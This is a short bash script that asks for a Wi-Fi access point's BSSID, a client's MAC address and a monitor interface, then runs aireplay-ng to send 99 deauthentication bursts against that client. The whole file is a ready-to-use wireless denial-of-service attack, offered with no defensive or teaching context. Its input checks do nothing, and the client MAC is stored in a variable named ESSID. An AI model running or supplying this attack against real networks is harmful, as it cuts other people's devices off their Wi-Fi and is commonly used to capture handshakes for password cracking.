#! /bin/bash

echo ""
echo "Please enter the network BSSID:"
echo ""
read BSSID
[[ $BSSID == "" ]]
echo ""
echo "Please enter the device STATION MAC ADDRESS:"
echo ""
read ESSID
[[ $ESSID == "" ]]
echo ""
echo "Please enter the monitor device name:"
echo ""
read MON
[[ $MON == "" ]]

sudo aireplay-ng -0 99 -a $BSSID -c $ESSID $MON
